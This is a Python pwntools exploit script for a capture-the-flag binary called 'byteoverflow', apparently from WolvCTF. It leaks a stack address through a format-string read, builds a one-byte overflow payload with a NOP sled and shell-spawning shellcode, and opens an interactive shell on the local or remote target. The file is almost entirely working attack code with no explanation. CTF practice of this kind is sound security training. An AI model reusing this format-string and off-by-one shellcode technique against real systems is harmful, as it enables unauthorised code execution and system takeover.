#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './byteoverflow'
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'byteoverflow.wolvctf.io', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *lookPost+250
break *opts+145
bereak *opts+146
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    # io.sendline(b'2')
    # payload = b''
    # for i in range(50, 70):
    #     payload += f'{i}=%{i}$p '.encode()
    # print(payload)

    io.sendline(b'2')
    payload = b'%53$p'
    io.sendline(payload)

    io.recvuntil(b'0x')
    stack = int(io.recvline(), 16)
    buffer_addr = stack - 0x198

    last_byte = int(hex(buffer_addr - 8 - 8)[-2:], 16)

    shellcode = asm(shellcraft.sh())
    print(len(shellcode))
    offset = 257
    payload = flat([
        b'\x90' * 184,
        buffer_addr,
        b'\x90' * (offset - len(shellcode) - 193),
        shellcode,
        p8(last_byte)
    ])

    info('Payload len: %#d', len(payload))
    info('Stack leak: %#x', stack)
    info('Shellcode start addr: %#x', buffer_addr)
    info('Last byte: %#x', last_byte)

    io.sendline(b'1')
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()